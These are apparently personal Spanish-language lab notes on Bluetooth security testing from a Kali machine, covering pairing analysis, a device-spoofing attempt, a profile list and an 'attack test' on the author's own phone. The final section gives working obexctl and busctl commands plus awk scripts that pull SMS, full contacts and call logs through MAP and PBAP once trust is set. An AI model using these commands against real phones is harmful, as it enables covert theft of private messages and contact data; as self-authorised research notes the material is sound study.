**Reconocimiento y Pairing**

hciconfig -a (Para comprobar que tenemos hardware levantado y listo para scanear)

bluetoothctl (Abrimos la herramienta: Consola iteractiva)
	power on (Enciende el adaptador Bluetooth en caso de que esté apagado)
	agent on (Activa un agente que gestiona las solicitudes de autenticación durante el pairing)
	default-agent (agente por defecto)
	scan on (Inicia el escaneo) (Si ponemos scan off, se purga la caché)

Tenemos al lado un móvil con Bluetooth encendido. Es cuestión de esperar para que lo detecte.
Hallazgo: Nombre en claro y MAC pública fija

info MAC y obtenemos la siguiente información

|UUID|Perfil|Relevancia|
|---|---|---|
|00001105|OBEX Object Push|Transferencia de archivos|
|0000110a|Audio Source|A2DP source|
|0000110c/0000110e|A/V Remote Control|Control multimedia|
|00001112|Headset AG|Manos libres|
|**0000111f**|PANU / NAP|⚠️ Personal Area Networking — perfil de tethering/puente de red vía BT|
|**0000112f**|Phonebook Access Server|⚠️ Acceso a agenda (sensible)|
|**00001132**|Message Access Server|⚠️ Acceso a mensajes/notificaciones (sensible)|
|00001200|PnP Information|Info de fabricante|
Abrimos otra terminal a la vez para hacer una captura paralela: btmon -w lab_pairing.pcap

Bien, ahora probamos haciendo un `pair MAC`: Encontramos que negocia un Numeric Comparison -> NIvel más alto de protección contra MITM

Abrimos la captura con wireshark:
Filtramos por btatt || btsmp (NO hay resultados. BTSMP es específico de BLE, por lo que intuímos que la conexión ha sido sobre Bluetooth Classic)
Pasamos al filtro de bthci_evt
Encontramos muchos eventos de Inquiry -> Tráfico de escaneo, no del pairing en sí. FIltraremos por los eventos del pairing.
thci_evt.code == 0x3b || bthci_evt.code == 0x3c || bthci_evt.code == 0x33 || bthci_evt.code == 0x17

0x3b — IO Capability Request: el controlador local pregunta/anuncia qué capacidades de entrada/salida tiene, como paso previo a decidir el método de pairing.

0x3c — IO Capability Response: el dispositivo remoto responde con sus propias capacidades de entrada/salida.

0x33 — User Confirmation Request: se solicita al usuario confirmar que el passkey mostrado coincide en ambos dispositivos (Numeric Comparison).

0x17 — Link Key Request: el controlador pregunta si ya existe una clave de enlace guardada de un pairing anterior con ese dispositivo.


![[Pasted image 20261121083807.png]]

El 154: Link Key Request
El 162: User Confirmation Request
![[Pasted image 20261121084222.png]]
Pasamos a otro filtro:
![[Pasted image 20261121084503.png]]158: Lo que el dispositivo anunció
![[Pasted image 20261121084700.png]]
IO Capability: Display Yes/No (1) — tu Kali anuncia que tiene pantalla y puede mostrar un valor y recibir una confirmación sí/no (de ahí el prompt "Confirm passkey 411555 (yes/no)" que salió antes).

OOB Data Present: Not Present — no se usa ningún canal fuera de banda (como NFC) para intercambiar claves.

Authentication Requirements: MITM Protection Required – Dedicated Bonding — tu Kali exige protección contra Man-in-the-Middle, y pide un bonding "dedicado" (vinculación persistente pensada para ese par de dispositivos específico, no solo una sesión temporal).


161: Lo que el dispositivo móvil respondió
![[Pasted image 20261121084816.png]]




**PRIMER LABORATORIO**

Escenario
1. Dispositivo de confianza: Cascos que el móvil ya empareja/conoce
2. Impostor: Ordenador que va a anunciarse con el mismo nombre que los cascos
3. Objetivo: Ver que ocurre

Bien, miramos el nombre de los cascos.
Abrimos la terminal, aplicamos bluetoothctl y cambiamos con system-alias el nombre para tener el mismo que el de los cascos.
discoverable on
pairable on
Vemos que no se produce la conexión. La MAC no es la misma, simplemente actualiza el nombre de mi kali al mismo nombre de mis cascos, pero los trata como dos elementos diferenciados. Necesito hardware específico ya que mi adaptador Bluetooth integrado no me permite modificar la MAC

Continuamos con la investigación:

Investigaremos que servicios y superficie de ataque (SDP Y L2CAP) expone el móvil o los cascos realmente.
Bien, haciendo un escaneo normal no aparecen los cascos. Supongo que no utilizan Bluetooth classic y se debe a que emplean BLE. Hacemos transport auto y volvemos a activar el scan. Ahora los detecta.

![[Pasted image 20261122074044.png]]
Primero, mientras el scan on, hacemos un pair MAC. (Se conecta y se desconecta)
Luego hacemos un trust MAC y un connect MAC.
En otra terminal: sudo btmon -w lab_p2961_conectado.pcap
En otra más
sdptool browse 41:42:C4:A3:BC:E4
![[Pasted image 20261122074837.png]]
Análisis de la captura obtenida:ç

**Arranque y escaneo HCI:** Paquetes `HCI_MON` iniciales y comandos `HCI_CMD` / `HCI_EVT` como `LE Set Extended Scan...`, `Inquiry` y `Extended Inquiry Result`.

**Fase de emparejamiento SSP, cifrado del enlace y salto a L2CAP**
SSP: Eventos HCI_EVT como Link Key Request / Negative(puesto que en este caso no hay clave previa). Seguido: IO Capability Request/Response (intercambio de capacidades de entrada salida para elegir el ssp adecuado) y User Confirmation Request/Response (Confirmación que valida el emparejamiento). Simple Pairing Complete y LInk Key Notification (así no hay que repetir el proceso la próxima vez)

Activación del cifrado: El host ordena cifrar el enlace (Set Connection Encryption) y el controller confirma con Encryption Change. Luego, el host envía petición para ller la clave de cifrado (99) y controller devuelve el resultado con Command Complete.  A partir de ahora, todo viajará cifradado.

Fase L2CAP: Autenticar con clave, cifrar el enlace y levantar RFCOMM.
Negociación de L2CAP (Information Request/Response), luego se abre el primer canal lógico  y se configura para fijar los parámetros como el MTU. Luego, primera consulta SDP (`Service Search Attribute Request` y `Service Search Attribute Response`) para descubrir que perfiles y puertos/canales están disponibles en los cascos. Autenticación con clave guardada y cifrado de enlace y se abre el canal L2CAP para sesión RFCOMM y canal 2
Canal 0 = carril de control. Gestiona la propia sesión
Canal 2 = carril Hands-Free
RFCOMM para Bluetooth classic. Emula un puerto serie sobre el trasnporte lógico L2CAP. Permite enviar flujos de bytes y mensajes de control

Sesión RFCOMM, apertura de canal 2 y transición a HFP/audio: El host encía SABM Channel = 0 para abrir el canal de multiplexación. Los cascos lo confirman. Preparación del canal virtual y apertura del canal 2 (anunciado previamente por SDP). A partir de ahora, el tráfico pasa a ser un diálogo HFP  mientras que el audio y el control se gestionan por canales L2CAP.

**SEGUNDO LABORATORIO**
1. Dispositivo : Teléfono móvil 
2. Dispositivo atacante: Ordenador kali
3. Objetivo: Hacer conexión. Comprobar que permisos explícitos ofrece cada perfil bluetooth y que se puede hacer con ellos. Para ello, se contará con autorización directa del móvil de forma manual y constante. 

**Audio, vídeo y control multimedia
* **A2DP** (*Advanced Audio Distribution Profile*): Envío de audio multimedia estéreo de alta calidad (p. ej., de un móvil a cascos o altavoz).
* **AVRCP** (*Audio/Video Remote Control Profile*): Control remoto de reproducción (reproducir, pausar, saltar pista, volumen, metadatos y navegación).
* **GAVDP** (*Generic Audio/Video Distribution Profile*): Perfil base que define el transporte para perfiles de audio y vídeo como A2DP y VDP.
* **VDP** (*Video Distribution Profile*): Transmisión de flujos de vídeo (muy poco usado en móviles modernos).

**Telefonía, manos libres y coche
* **HFP** (*Hands-Free Profile*): Gestión de llamadas y audio de voz bidireccional (responder, colgar, marcar, estado de llamada/red) en manos libres y sistemas de coche.
* **HSP** (*Headset Profile*): Perfil básico de auricular y micrófono con control simple de llamada.
* **SAP / rSAP** (*SIM Access Profile*): Permite a un equipo externo (habitualmente un coche) acceder a la tarjeta SIM del teléfono para gestionar la conexión celular.
* **CTP** (*Cordless Telephony Profile*): Telefonía inalámbrica doméstica (histórico / en desuso).
* **IP** (*Intercom Profile*): Funciones de intercomunicador entre dispositivos (histórico / en desuso).

**Objetos, archivos, contactos, mensajes y sincronización (OBEX)
* **OPP** (*Object Push Profile*): Envío o recepción puntual de objetos como contactos (`vCard`), eventos (`vCalendar`), imágenes o archivos.
* **FTP** (*File Transfer Profile*): Exploración de carpetas y transferencia/gestión de archivos sobre un modelo de sesión OBEX.
* **PBAP** (*Phone Book Access Profile*, roles **PCE** / **PSE**): Lectura/descarga de agenda de contactos e historial de llamadas.
* **MAP** (*Message Access Profile*, roles **MSE** / **MNS**): Acceso a carpetas, listado, lectura, envío o notificación de mensajes/notificaciones compatibles.
* **CTN** (*Calendar, Tasks and Notes Profile*): Acceso a calendarios, tareas y notas mediante OBEX.
* **SYNCH** (*Synchronization Profile*): Sincronización de información personal (agenda, calendario, notas) sobre OBEX.
* **BIP** (*Basic Imaging Profile*): Transferencia, visualización o redimensionado básico de imágenes (en desuso).
* **BPP** (*Basic Printing Profile*): Envío de trabajos de impresión a impresoras (en desuso).
* **FAX**: Envío/recepción de faxes a través de un teléfono o módem Bluetooth (histórico).

**Periféricos, puerto serie y red
* **HID** (*Human Interface Device Profile*): Teclados, ratones, mandos de juego y dispositivos de entrada.
* **SPP** (*Serial Port Profile*): Emulación de puerto serie (`RS-232`) sobre `RFCOMM` para flujos de bytes, módulos o depuración.
* **PAN** (*Personal Area Networking Profile*, roles **PANU**, **NAP**, **GN**): Redes de área personal y compartición de conexión de red sobre `BNEP`.
* **DUN** (*Dial-Up Networking Profile*): Uso de un teléfono o módem como enlace de acceso a datos/red sobre `RFCOMM`.

**Salud, base del protocolo e identificación
* **HDP** (*Health Device Profile*): Intercambio estructurado de datos desde dispositivos médicos y de salud (básculas, tensiómetros, glucómetros, etc.).
* **GAP** (*Generic Access Profile*): Descubrimiento de dispositivos, modos de conexión y gestión general de acceso/seguridad.
* **SDAP** (*Service Discovery Application Profile*): Consulta y descubrimiento de servicios disponibles mediante SDP.
* **DID / DI** (*Device Identification Profile*): Información de identificación del dispositivo (fabricante, producto, versión).
* **GOEP** (*Generic Object Exchange Profile*): Perfil base común para perfiles orientados a objetos sobre OBEX (OPP, FTP, PBAP, MAP, etc.).
* **CIP** (*Common ISDN Access Profile*): Acceso a servicios ISDN por Bluetooth (histórico).


**Primera Prueba**
He ido probando algún que otro perfil interesante
sdptool browse MAC (descubrir servicios SDP y comprobar los perfiles)
obexctl
connect MAC map (por ejemplo) -> Pide acceso explícito, aunque luego tengo acceso a los mensajes. Por ejemplo probé opp y permite mandar y recibir archivos, pero siempre con consentimiento directo del individuo.

Bien, aquí nace la idea del ataque. Estar emparejado y ser de confianza no te otorga autorización para todos los perfiles. PBAP, HFP, A2DP, MAP (algunas veces) -> La autorización se asocia a la link key del dispositivo
OPP está pensado para momentos esporádicos -> NIngún stack stándar lo deja confiado de manera permanente.

**Prueba ataque**
Iniciamos conexión. Anteriormente he hecho el trust, así que conecta directamente.
sdptool browse MAC (todos los perfiles que tenemos disponibles)

**A2DP**: Streaming de audio del móvil hacia el atacante como si fuera un altavoz (IMpacto bajo, solo audio saliente)
sudo apt install pulseaudio-utils
bluetooth info MAC -> comprobamos que esté la salida UUID: Advanced Audio DIstribution ...
sudo apt install bluez-alsa-utils
sudo systemctl enable --now bluealsa
bluealsa-aplay MAC

Bien, de esta forma conseguimos utilizar el ordenador como altavoz. Veo la utilidad para una ataque muy reducida

**AVRCP**: Control remoto sobre la reproducción multimedia del móvil. Cosas como darle a play, subir el volumen, lectura de metadatos como título o artista... Nada muy relevante. Quizá sea incluso menos interesante que el de arriba. Eso sí. 0 interacción de la vćitima y cero autorización explícita.

**HSP**: Perfil más simple y antiguo de manos libres, predecesor del HFP. Permite capturar una llamada en curso, aunque requiere iteracción explícita del usuario la primera vez (sólo la primera). Para tener acceso al micrófono de manera continua, no solo en llamada, habría que explotar una vulnerabilidad adicional. 
Funciona como si conecteras unos auriculares. El audio dejaría de llegar al móvil y se desviaría a la máquina atacante, por lo que sería detectado al momento.

**HFP**: No he logrado acceder. Ya lo lograré

**MAP**: Acceso a listar y leer SMS, notificacines en apps como whatsapp o telegram...
obexctl
connect MAC map
Bien, esto pedirá el promp de autenticación solo la primera vez. Luego no lo hace.
AL hacer la conexión, encontramos sessión1 y al final session 2
session 1 es el cliente (canal que controlas): Por aquí es por donde vas a listar carpetas, descargar mensajes...
session 2 es el canal MNS (Message Notification Service). Kali actúa como servidor OBEX, recibiendo las notificaciones

busctl --user tree org.bluez.obex
busctl --user introspect org.bluez.obex /org/bluez/obex/client/session1 | grep -E "interface|method"

busctl --user call org.bluez.obex /org/bluez/obex/client/session1 org.bluez.obex.MessageAccess1 ListMessages sa{sv} "" 0 -> Con este comando obtuve acceso a todos los mensajes sms

      └─ /org/bluez/obex/server
        └─ /org/bluez/obex/server/session2
Por lo que he visto, funcionaría solo para SMS. Lo de whatsapp es más complejo, pero lo miraré más tarde.

**PBAP**: Descarga completa de contactos. Acceso al historial de llamadas entrantes (ich), salientes (och), perdidas (mch) o combinadas (cch). Persistente tras la primera confirmación. Es solo lectura: NO se puede crear ni eliminar contactos
obexctl
connect MAC pbab (Pedirá confirmación en el teléfono móvil)
list y show
Desde la terminal de obexctl pone muchas pegas. Abrimos otra terminal sin cerrar esa y vamos sacando cosas:
busctl --user call org.bluez.obex /org/bluez/obex/client/session0 org.bluez.obex.PhonebookAccess1 Select ss "int" "pb" busctl --user call org.bluez.obex /org/bluez/obex/client/session0 org.bluez.obex.PhonebookAccess1 GetSize busctl --user call org.bluez.obex /org/bluez/obex/client/session0 org.bluez.obex.PhonebookAccess1 PullAll "sa{sv}" "/tmp/agenda_completa.vcf" 0 sleep 3
awk -F: '
  /^FN:/ {
    gsub(/\r/, "", $0)
    name = substr($0, index($0, ":") + 1)
    phones = ""
  }
  /^TEL/ {
    gsub(/\r/, "", $0)
    num = $NF
    gsub(/^[[:space:]]+|[[:space:]]+$/, "", num)
    if (num != "") {
      phones = (phones == "" ? num : phones ", " num)
    }
  }
  /^END:VCARD/ {
    if (name != "") {
      printf "%s -> %s\n", name, (phones != "" ? phones : "(sin teléfono)")
    }
    name = ""
    phones = ""
  }
' /tmp/agenda_tel.vcf

SACA LOS CONTACTOS DEL TELÉFONO CON SU NOMBRE Y NÚMERO

busctl --user call org.bluez.obex /org/bluez/obex/client/session0 org.bluez.obex.PhonebookAccess1 Select ss "int" "ich"
busctl --user call org.bluez.obex /org/bluez/obex/client/session0 org.bluez.obex.PhonebookAccess1 PullAll "sa{sv}" "/tmp/recibidas_ich.vcf" 0

sleep 2

busctl --user call org.bluez.obex /org/bluez/obex/client/session0 org.bluez.obex.PhonebookAccess1 Select ss "int" "och"
busctl --user call org.bluez.obex /org/bluez/obex/client/session0 org.bluez.obex.PhonebookAccess1 PullAll "sa{sv}" "/tmp/hechas_och.vcf" 0

sleep 2

busctl --user call org.bluez.obex /org/bluez/obex/client/session0 org.bluez.obex.PhonebookAccess1 Select ss "int" "mch"
busctl --user call org.bluez.obex /org/bluez/obex/client/session0 org.bluez.obex.PhonebookAccess1 PullAll "sa{sv}" "/tmp/perdidas_mch.vcf" 0

```
```for tipo_archivo in "RECIBIDA:/tmp/recibidas_ich.vcf" "HECHA:/tmp/hechas_och.vcf" "PERDIDA:/tmp/perdidas_mch.vcf" "COMBINADA:/tmp/llamadas_full.vcf"; do
  tipo="${tipo_archivo%%:*}"
  archivo="${tipo_archivo#*:}"
  [ -s "$archivo" ] || continue

  awk -F: -v tipo="$tipo" '
    /^BEGIN:VCARD/ {
      fn = ""; tel = ""; dt = ""; extra = ""
    }
    /^FN:/ {
      gsub(/\r/, "", $0)
      fn = substr($0, index($0, ":") + 1)
    }
    /^TEL/ {
      gsub(/\r/, "", $0)
      val = $NF
      gsub(/^[[:space:]]+|[[:space:]]+$/, "", val)
      if (val != "") tel = (tel == "" ? val : tel " | " val)
    }
    /^X-IRMC-CALL-DATETIME/ {
      gsub(/\r/, "", $0)
      val = substr($0, index($0, ":") + 1)
      gsub(/^[[:space:]]+|[[:space:]]+$/, "", val)
      dt = val
    }
    /^X-/ && !/^X-IRMC-CALL-DATETIME/ {
      gsub(/\r/, "", $0)
      extra = (extra == "" ? $0 : extra " ; " $0)
    }
    /^END:VCARD/ {
      if (tel != "" || fn != "" || dt != "" || extra != "") {
        printf "[%s] [%s] %s -> %s%s\n",
          tipo,
          (dt != "" ? dt : "sin fecha"),
          (fn != "" ? fn : "Desconocido"),
          (tel != "" ? tel : "sin número"),
          (extra != "" ? " | EXTRA: " extra : "")
      }
    }
  ' "$archivo"
done
```
SACA EL REGISTRO DE LLAMADAS COMPLETO

**OPP**: Transmisión y recepción de archivos de forma puntual. NO hay forma de hacerlo de manera silenciosa, piden confirmación cada vez. Lo único que se me ocurre es manipular una petición o dispositivo bluetooth legítimo y que envíe lo que yo quiero, pero no entra dentro de este laboratorio. Entraría en el apartado de ingeniería social.